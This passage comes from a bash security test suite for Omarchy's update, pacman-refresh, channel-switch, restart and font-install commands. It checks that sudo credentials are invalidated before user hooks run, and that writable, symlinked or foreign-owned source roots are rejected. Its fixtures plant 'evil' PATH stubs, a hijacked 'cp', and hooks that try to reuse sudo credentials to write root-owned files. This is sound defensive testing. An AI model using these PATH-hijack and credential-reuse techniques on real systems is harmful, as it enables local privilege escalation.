wait_for_persistent_attempts "$test_home/update.pid"
assert_hook_sandboxed "$update_victim" "$update_dir_victim" "$update_persistent_victim"
pass "interactive update invalidates a pre-existing credential before user code"

for failing_stage in migration signal; do
  reset_case
  set +e
  run_as_user env TEST_FAILING_STAGE="$failing_stage" TEST_SKIP_LATE_AUTH=1 \
    TEST_ROOT_VICTIM="$update_victim" TEST_ROOT_DIR_VICTIM="$update_dir_victim" \
    TEST_PERSISTENT_VICTIM="$update_persistent_victim" TEST_PERSISTENT_PID="$test_home/update.pid" \
    TEST_MISE_VICTIM="$mise_victim" TEST_MISE_PID="$test_home/mise.pid" \
    OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-update" -y \
    >"$test_tmp/update-$failing_stage.out" 2>"$test_tmp/update-$failing_stage.err"
  status=$?
  set -e
  (( status != 0 )) || fail "update $failing_stage case unexpectedly succeeded"
  [[ ! -e $token ]] || fail "update $failing_stage exit left its credential live"
  [[ ! -s $hook_log ]] || fail "update $failing_stage case reached user-controlled stages"
done
pass "failed and signaled updates invalidate credentials before user code"

reset_case
set +e
run_as_user env TEST_SUDO_NO_N=1 OMARCHY_UPDATE_LOGGED=1 \
  "$ROOT/bin/omarchy-update" -y >"$test_tmp/no-update-unsupported.out" 2>"$test_tmp/no-update-unsupported.err"
status=$?
set -e
(( status != 0 )) || fail "update accepted sudo without --no-update support"
! grep -qE '^(authenticate|grant)' "$event_log" || fail "unsupported sudo reached privileged update work"
grep -q 'does not support --no-update' "$test_tmp/no-update-unsupported.err" ||
  fail "unsupported sudo failure did not explain the missing security primitive"
pass "update fails closed before privileged work when sudo lacks --no-update"

# The config parser is the authority for all three scoped commands. Exercise a
# different unsafe shape through each copy before restoring the valid config.
chmod 0666 /etc/omarchy.conf
if run_as_user env OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-update" -y \
  >"$test_tmp/untrusted-update.out" 2>"$test_tmp/untrusted-update.err"; then
  fail "update accepted a writable source-root authorization"
fi

/usr/bin/mv /etc/omarchy.conf /etc/omarchy.real
/usr/bin/ln -s /etc/omarchy.real /etc/omarchy.conf
if run_as_user "$ROOT/bin/omarchy-refresh-pacman" stable \
  >"$test_tmp/untrusted-refresh.out" 2>"$test_tmp/untrusted-refresh.err"; then
  fail "pacman refresh accepted a symlinked source-root authorization"
fi
/usr/bin/rm /etc/omarchy.conf
/usr/bin/mv /etc/omarchy.real /etc/omarchy.conf

chown 1000:1000 /etc/omarchy.conf
if run_as_user "$ROOT/bin/omarchy-update-restart" --services-only \
  >"$test_tmp/untrusted-restart.out" 2>"$test_tmp/untrusted-restart.err"; then
  fail "update restart accepted a non-root source-root authorization"
fi
write_authorized_source_root "$test_tmp"
pass "update commands reject writable, symlinked, and non-root source-root authorization"

# A root-owned config may authorize a development checkout, but not a tree
# another local account (or every account) can rewrite. Exercise both unsafe
# directory-chain shapes before restoring the valid authorized fixture.
writable_source_root="$test_tmp/writable-source-root"
foreign_source_root="$test_tmp/foreign-source-root"
mkdir -p "$writable_source_root" "$foreign_source_root"
chown 1000:1000 "$writable_source_root"
chmod 0777 "$writable_source_root"
chown 1001:1001 "$foreign_source_root"
chmod 0755 "$foreign_source_root"

write_authorized_source_root "$writable_source_root"
if run_as_user env OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-update" -y \
  >"$test_tmp/writable-source.out" 2>"$test_tmp/writable-source.err"; then
  fail "update accepted a group/world-writable authorized source tree"
fi
grep -q 'untrusted Omarchy source root' "$test_tmp/writable-source.err" ||
  fail "writable source-root rejection happened after the trust parser"

write_authorized_source_root "$foreign_source_root"
if run_as_user "$ROOT/bin/omarchy-migrate" --pending \
  >"$test_tmp/foreign-source.out" 2>"$test_tmp/foreign-source.err"; then
  fail "migration runner accepted a foreign-owned authorized source tree"
fi
grep -q 'untrusted Omarchy source root' "$test_tmp/foreign-source.err" ||
  fail "foreign source-root rejection happened after the trust parser"
write_authorized_source_root "$test_tmp"
pass "authorized source roots reject foreign-owned and group/world-writable path components"

# The restart marker is attacker-writable, but its value is now an allowlisted
# selector into the configured Omarchy tree rather than a command resolved by
# PATH. A dev-linked tree is honored only through root-owned /etc/omarchy.conf.
reset_case
restart_home="$test_tmp/restart-home"
restart_log="$test_tmp/restart.log"
mkdir -p "$restart_home/.local/state/omarchy"
touch "$restart_log"
chown -R 1000:1000 "$restart_home"
chown 1000:1000 "$restart_log"
touch "$restart_home/.local/state/omarchy/restart-btop-required" \
  "$restart_home/.local/state/omarchy/restart-evil-required"
chown 1000:1000 "$restart_home/.local/state/omarchy"/*
cat >"$stub_bin/omarchy-restart-btop" <<'STUB'
#!/bin/bash
echo trusted-btop >>"$TEST_RESTART_LOG"
STUB
cat >"$stub_bin/omarchy-restart-shell" <<'STUB'
#!/bin/bash
echo trusted-shell >>"$TEST_RESTART_LOG"
STUB
evil_bin="$test_home/evil-bin"
mkdir -p "$evil_bin"
cat >"$evil_bin/omarchy-restart-btop" <<'STUB'
#!/bin/bash
echo path-btop >>"$TEST_RESTART_LOG"
STUB
cat >"$evil_bin/omarchy-restart-evil" <<'STUB'
#!/bin/bash
echo path-evil >>"$TEST_RESTART_LOG"
sudo /usr/bin/true
STUB
chown -R 1000:1000 "$evil_bin"
chmod 0755 "$stub_bin/omarchy-restart-btop" "$stub_bin/omarchy-restart-shell" "$evil_bin"/*
run_as_user env HOME="$restart_home" PATH="$evil_bin:$stub_bin:/usr/bin:/bin" \
  OMARCHY_PATH="$test_home/evil-root" TEST_RESTART_LOG="$restart_log" \
  "$ROOT/bin/omarchy-update-restart" --services-only >"$test_tmp/restart.out" 2>"$test_tmp/restart.err"
grep -qxF trusted-btop "$restart_log" || fail "allowed marker did not use the configured Omarchy command"
grep -qxF trusted-shell "$restart_log" || fail "shell restart did not use the configured Omarchy command"
! grep -q '^path-' "$restart_log" || fail "restart marker resolved an attacker PATH command"
[[ ! -e $restart_home/.local/state/omarchy/restart-evil-required ]] || fail "unsupported restart marker was retained"
pass "restart markers use an allowlist and fixed configured command paths"

special_root="$test_tmp/dev root\\checkout\$cash"
special_home="$test_tmp/special-home"
special_log="$test_tmp/special.log"
mkdir -p "$special_root/bin" "$special_home/.local/state/omarchy"
touch "$special_home/.local/state/omarchy/restart-btop-required" "$special_log"
chown -R 1000:1000 "$special_home" "$special_log"
cat >"$special_root/bin/omarchy-restart-btop" <<'STUB'
#!/bin/bash
echo special-btop >>"$TEST_RESTART_LOG"
STUB
cat >"$special_root/bin/omarchy-restart-shell" <<'STUB'
#!/bin/bash
exit 0
STUB
chmod 0755 "$special_root/bin"/*
chown -R 1000:1000 "$special_root"
write_authorized_source_root "$special_root"
run_as_user env HOME="$special_home" TEST_RESTART_LOG="$special_log" \
  "$ROOT/bin/omarchy-update-restart" --services-only \
  >"$test_tmp/special-root.out" 2>"$test_tmp/special-root.err"
grep -qxF special-btop "$special_log" || fail "authorized quoted dev root did not dispatch its restart helper"
write_authorized_source_root "$test_tmp"
pass "source-root authorization decodes spaces, backslashes, and dollar signs"

# The legacy pre-refresh hook now runs only after pacman; a detached child can
# no longer wait for a later authentication in either tty or global mode.
write_attack_hook pre-refresh-pacman
refresh_victim="$root_dir/84-refresh-hook.rules"
refresh_dir_victim="$root_dir/85-refresh-hook-dir.rules"
refresh_persistent_victim="$root_dir/86-refresh-hook-child.rules"
reset_case
authenticate_for_test
cat >"$evil_bin/cp" <<'STUB'
#!/bin/bash
touch "$TEST_EVIL_REFRESH_MARKER"
exit 97
STUB
chmod 0755 "$evil_bin/cp"
evil_refresh_marker="$test_home/evil-refresh-ran"
set +e
run_as_user env PATH="$evil_bin:$stub_bin:/usr/bin:/bin" OMARCHY_PATH="$evil_update_root" \
  TEST_EVIL_REFRESH_MARKER="$evil_refresh_marker" \
  TEST_ROOT_VICTIM="$refresh_victim" TEST_ROOT_DIR_VICTIM="$refresh_dir_victim" \
  TEST_PERSISTENT_VICTIM="$refresh_persistent_victim" TEST_PERSISTENT_PID="$test_home/refresh.pid" \
  "$ROOT/bin/omarchy-refresh-pacman" stable >"$test_tmp/refresh.out" 2>"$test_tmp/refresh.err"
status=$?
set -e
(( status == 0 )) || fail "isolated pacman refresh failed" "$(<"$test_tmp/refresh.err")"
wait_for_persistent_attempts "$test_home/refresh.pid"
assert_hook_sandboxed "$refresh_victim" "$refresh_dir_victim" "$refresh_persistent_victim"
[[ ! -e $evil_refresh_marker ]] || fail "pacman refresh resolved cp through caller PATH"
/usr/bin/cmp -s "$test_tmp/default/pacman/pacman-stable.conf" /etc/pacman.conf ||
  fail "pacman refresh did not copy config from the authorized source root"
[[ ! -e $evil_refresh_marker ]] || fail "pacman refresh copied from inherited OMARCHY_PATH or PATH"
pass "pacman refresh runs its legacy hook only after all privileged work"

reset_case
authenticate_for_test
set +e
run_as_user env TEST_PACMAN_STATUS=1 TEST_ROOT_VICTIM="$refresh_victim" \
  TEST_ROOT_DIR_VICTIM="$refresh_dir_victim" TEST_PERSISTENT_VICTIM="$refresh_persistent_victim" \
  TEST_PERSISTENT_PID="$test_home/refresh.pid" "$ROOT/bin/omarchy-refresh-pacman" stable \
  >"$test_tmp/refresh-fail.out" 2>"$test_tmp/refresh-fail.err"
status=$?
set -e
(( status != 0 )) || fail "failing pacman refresh unexpectedly succeeded"
[[ ! -e $token ]] || fail "failed pacman refresh left its credential live"
[[ ! -s $hook_log ]] || fail "failed pacman transaction reached the refresh hook"
pass "failed pacman refresh invalidates and does not run its hook"

# Channel switching is a composite refresh caller: after refreshing it
# authenticates for the package swap and runs the full update. Exercise the
# real channel, refresh, update, and hook commands against the global-token
# model. A detached legacy refresh-hook child must not start until that entire
# chain has finished.
cat >"$test_home/.config/omarchy/hooks/post-update" <<'HOOK'
#!/bin/bash
printf 'post-update:%s\n' "$(id -u)" >>"$TEST_HOOK_LOG"
HOOK
chown 1000:1000 "$test_home/.config/omarchy/hooks/post-update"
chmod 0700 "$test_home/.config/omarchy/hooks/post-update"
channel_victim="$root_dir/91-channel-refresh-hook.rules"
channel_dir_victim="$root_dir/92-channel-refresh-dir.rules"
channel_persistent_victim="$root_dir/93-channel-refresh-child.rules"
channel_mise_victim="$root_dir/94-channel-mise-child.rules"
reset_case
set +e
evil_channel_helper_marker="$test_home/evil-channel-helper-ran"
evil_channel_helper_victim="$root_dir/98-channel-path-helper.rules"
run_as_user env PATH="$evil_update_bin:$stub_bin:/usr/bin:/bin" \
  TEST_EVIL_CHANNEL_HELPER_MARKER="$evil_channel_helper_marker" \
  TEST_EVIL_CHANNEL_VICTIM="$evil_channel_helper_victim" \
  TEST_ROOT_VICTIM="$channel_victim" TEST_ROOT_DIR_VICTIM="$channel_dir_victim" \
  TEST_PERSISTENT_VICTIM="$channel_persistent_victim" TEST_PERSISTENT_PID="$test_home/channel.pid" \
  TEST_MISE_VICTIM="$channel_mise_victim" TEST_MISE_PID="$test_home/channel-mise.pid" \
  OMARCHY_UPDATE_LOGGED=1 "$ROOT/bin/omarchy-channel-set" stable \
  >"$test_tmp/channel.out" 2>"$test_tmp/channel.err"
status=$?
set -e
(( status == 0 )) || fail "isolated channel switch failed" "$(<"$test_tmp/channel.err")"
wait_for_persistent_attempts "$test_home/channel.pid"
wait_for_persistent_attempts "$test_home/channel-mise.pid"
assert_hook_sandboxed "$channel_victim" "$channel_dir_victim" "$channel_persistent_victim"
[[ ! -e $channel_mise_victim ]] || fail "channel mise child reused a later refresh-hook credential"
[[ ! -e $evil_channel_helper_marker && ! -e $evil_channel_helper_victim ]] ||
  fail "channel switch resolved a post-pacman helper through caller PATH"
[[ $(grep -c '^file:1000$' "$hook_log") == 1 ]] || fail "channel switch did not run the deferred refresh hook exactly once"
pass "channel switching defers its refresh hook past every later authentication"

cat >"$stub_bin/omarchy-launch-floating-terminal-with-presentation" <<'STUB'
#!/bin/bash
exec bash -c "$1"
STUB
cat >"$stub_bin/omarchy-pkg-add" <<'STUB'
#!/bin/bash
[[ ${OMARCHY_SUDO_NO_UPDATE:-0} == 1 ]] || exit 98
/usr/bin/sudo -N -- /usr/bin/true
exit "${TEST_PKG_STATUS:-0}"
STUB
cat >"$stub_bin/omarchy-font-set" <<'STUB'
#!/bin/bash
exec bash "$TEST_ROOT/bin/omarchy-font-set" "$@"
STUB
cat >"$stub_bin/fc-list" <<'STUB'
#!/bin/bash
echo 'Example Family'
STUB
cat >"$stub_bin/omarchy-restart-shell" <<'STUB'
#!/bin/bash
exit 0
STUB
cat >"$stub_bin/pgrep" <<'STUB'
#!/bin/bash
exit 1
STUB
cat >"$stub_bin/sleep" <<'STUB'
#!/bin/bash
exit 0
STUB
chmod 0755 "$stub_bin"/*
chmod 4755 "$stub_bin/sudo"
mount --bind "$stub_bin/omarchy-launch-floating-terminal-with-presentation" \
  /usr/bin/omarchy-launch-floating-terminal-with-presentation
mount --bind "$stub_bin/omarchy-pkg-add" /usr/bin/omarchy-pkg-add
mount --bind "$stub_bin/omarchy-font-set" /usr/bin/omarchy-font-set
font_paths_bound=1

write_attack_hook font-set
font_victim="$root_dir/87-font-hook.rules"
font_dir_victim="$root_dir/88-font-hook-dir.rules"
font_persistent_victim="$root_dir/89-font-hook-child.rules"
reset_case
set +e
run_as_user env TEST_ROOT_VICTIM="$font_victim" TEST_ROOT_DIR_VICTIM="$font_dir_victim" \
  TEST_PERSISTENT_VICTIM="$font_persistent_victim" TEST_PERSISTENT_PID="$test_home/font.pid" \
  "$ROOT/bin/omarchy-install-font" 'Example Font' example-font 'Example Family' \
  >"$test_tmp/font.out" 2>"$test_tmp/font.err"
status=$?
set -e
(( status == 0 )) || fail "isolated font install failed" "$(<"$test_tmp/font.err")"
wait_for_persistent_attempts "$test_home/font.pid"
assert_hook_sandboxed "$font_victim" "$font_dir_victim" "$font_persistent_victim"
pass "font installation invalidates before file, directory, and persistent hooks"

reset_case
set +e
run_as_user env TEST_PKG_STATUS=1 TEST_ROOT_VICTIM="$font_victim" \
  TEST_ROOT_DIR_VICTIM="$font_dir_victim" TEST_PERSISTENT_VICTIM="$font_persistent_victim" \
  TEST_PERSISTENT_PID="$test_home/font.pid" \
  "$ROOT/bin/omarchy-install-font" 'Example Font' example-font 'Example Family' \
  >"$test_tmp/font-fail.out" 2>"$test_tmp/font-fail.err"
status=$?
set -e
(( status != 0 )) || fail "failing font package installation unexpectedly succeeded"
[[ ! -e $token ]] || fail "failed font package installation left its credential live"
[[ ! -s $hook_log ]] || fail "failed font package installation reached the hook"
pass "failed font installation invalidates without running its hook"
